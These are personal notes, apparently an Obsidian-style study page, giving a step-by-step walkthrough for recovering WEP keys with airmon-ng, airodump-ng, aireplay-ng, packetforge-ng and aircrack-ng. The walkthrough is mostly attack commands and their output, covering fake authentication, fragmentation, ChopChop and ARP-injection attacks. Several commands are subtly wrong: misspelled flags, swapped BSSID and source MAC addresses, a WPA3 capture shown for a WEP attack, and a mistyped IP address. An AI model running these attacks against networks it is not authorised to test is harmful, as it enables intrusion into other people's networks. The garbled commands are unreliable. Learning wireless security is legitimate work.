---
Author: Sumit Kumar
Email: ravirajkarn21@gmail.com
Date Created: 2025-10-21 08:03::33 AM
tags:
  - wifi
  - wireless
  - Linux
  - command
  - hacking
---

# WEP
## [FiOS SSID WEP Key Recovery](FiOS SSID WEP Key Recovery)
![](FiOS%20SSID%20WEP%20Key%20Recovery.jpg)

The first person to document this was Kyle Anderson, who provided a simple Bash script to generate the WEP keys (see http://wiki.xkyle.com/Fioscalc.html)

## Break WEP with aircrack-ng with a Victim Client

- enable monitor mode [airmon-ng](airmon-ng.md)
```bash
sudo airmon-ng start wlan0 1

```
- start [airodump-ng](airodump-ng.md)
```bash
sudo airodump-ng -c 11 --bssid 86:FB:E0:B7:B2:DC --wirte bssid_file_name mon0

 CH  11 ][ Elapsed: 42 s ][ 2025-10-21 11:06 ][ color on

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 86:FB:E0:B7:B2:DC  -73       38     1263    8  11  180   WPA3 CCMP   SAE  Redmi 13C 5G

 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes

 (not associated)   00:0C:E7:FB:C5:02  -86    0 - 1      0        2
 (not associated)   00:0C:E7:0E:C4:42  -91    0 - 1      0        4
 (not associated)   00:0C:E7:F9:8C:47  -87    0 - 1      0        2
 86:FB:E0:B7:B2:DC  BA:5D:AF:3E:66:E8  -61   24e-24e   992       35
 86:FB:E0:B7:B2:DC  00:71:CC:3A:31:0F  -67   24e- 1      0       18         Redmi 13C 5G
 86:FB:E0:B7:B2:DC  FE:4B:AA:03:B6:12  -60   24e-24e     0     1270         Redmi 13C 5G
```
- In this example, you see there is some client associated
(BA:5D:AF:3E:66:E8). Let’s utilize that MAC address and reinject ARP packets from the client. Our goal is to create more packets so we can crack the key faster:
```bash
sudo aireplay-ng --arpreplay -h BA:5D:AF:3E:66:E8 -b 86:FB:E0:B7:B2:DC mon0

12:12:47  Waiting for beacon frame (BSSID: 86:FB:E0:B7:B2:DC) on channel 11
Saving ARP requests in replay_arp-1021-121247.cap
You should also start airodump-ng to capture replies.
Read 16745 packets (got 0 ARP requests and 414 ACKs), sent 0 packets...(0 pps)

```

## Break WEP with aircrack-ng Without a Victim Client
![](Break%20WEP%20with%20aircrack-ng%20Without%20a%20Victim%20Client.jpg)

### Process

- **Step 1:** Start airodump-ng 
```bash 
sudo airodump-ng --channel 11 --bssid 10:fe:ed:40:95:b5 --write quiet_type mon0
```

- **Step 2:** Fake-auth the AP 
use aireplay-ng to fake an association with an AP. This is similar to the connection process of a legitimate client; you are just utilizing aireplay-ng to accomplish it without knowledge of the WEP key.
```bash
sudo ip addr show mon0
8: mon0: <BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default qlen 1000
    link/ieee802.11/radiotap ba:5d:af:3e:66:e8 brd ff:ff:ff:ff:ff:ff permaddr 44:a3:bb:12:29:8d
```
Use the MAC address of the wireless card and pass it as the source (-h) to aireplay-ng:
```bash
sudo aireplay-ng --fakeauth 1 -o 1 -e quiet_type -b BA:5D:AF:3E:66:E8 -h 10:fe:ed:40:95:b5 mon0
```
argument details:
1. `--fakeauth 1` : It tell to perform the fake-auth with one-second delay.
2. `-o 1`: only send one set of packets at time during the attack to reduce the impact on the AP
3. `-e`: sets the SSID
4. `-b`: sets the BSSIS
5. `-h`: sets the Source MAC(this show be the MAC currently assigned to your wireless interface).
_**SUCCESSFUL:**_
```bash
00:36:25 Waiting for beacon frame (ESSID: quiet_type) on channel 11 Found BSSID "10:FE:ED:40:95:B5" to Found ESSID "quiet_type".
00:36:25 Sending Authentication Request (Open System) [ACK]
00:36:25 Authentication successful
00:36:25 Sending Association Request [ACK]
00:36:25 Association successful :-) (ACK: 1)
00:36:26 Sending Reassociation Request [ACK]
00:36:26 Reassociation successful :-0 (AID: 1)
```
_**FAILURE:**_
If you see a message that says “Got a deauthentication packet!” then the fake association has failed. The most likely cause is that the AP implements MAC filtering. You will need to wait until a legitimate device connects to the network and use its MAC address for the attack.

- **Step 3:** Launch the Fragmentation Attack
The fragmentation attack is an advanced WEP cracking technique that can be used to decrypt a single packet at a time using the AP as a decryption tool. 

```bash
sudo aireplay-ng --fgment -e quiet_type -b BA:5D:AF:3E:66:E8 -h 10:fe:ed:40:95:b5 mon0
```

- **Step 4:** Launch the ChopChop Attack
You can speed up the ChopChop attack by only using smaller packets. Any packet larger than 68 bytes should be sufficient for later use in an ARP injection attack.

```bash
sudo aireplay-ng --chopchop -e quiet_type -b BA:5D:AF:3E:66:E8 -h 10:fe:ed:40:95:b5 mon0
```
_**Tip:**_ The larger the packet, the longer the ChopChop attack will take to finish. If your packet is larger than 300 bytes, you may want to consider skipping it and waiting for a smaller one.

- **Step 5:** Craft the ARP Packet
 packetforge-ng, that helps to craft this packet. First, you pass packetforge the --arp parameter so it knows what type of packet you want to craft. Next, you specify the layer 2 options (BSSID, destination, and source MAC addresses) with the -a and -h flags as usual. Next, you build the ARP layer by specifying the destination IP with -k and the source IP with -l (that’s a lowercase L, not a one). Finally, you encrypt the new packet with the keystream generated from the ChopChop attack using -y, as shown:

```bash
sudo packetforge-ng --arp -a 10:fe:ed:40:95:b5 -h 00:C0:CA:60:1F:D7 -k 192.168.0.122 -l 193.168.0.123 -y replay_dec-0620-012702.xor -w forged_arp.cap
```
With your crafted ARP packet that is correctly encrypted for the network, you can inject it into the network and see if the total number of data packets on airodump-ng increases.

- **Step 6:** Inject the Crafted ARP Packet
```bash
sudo aireplay-ng --interactive -F -r ./forged_arp.cap -h 00:C0:CA:60:1F:D7 mon0
```

- **Step 7:** Start aircrack-ng
```bash
sudo aircrack-ng ./quiet_type-*.cap
```


### wifite
use wifite to automate all the above steps . wifite will spend 20 minutes in all the attacks. 
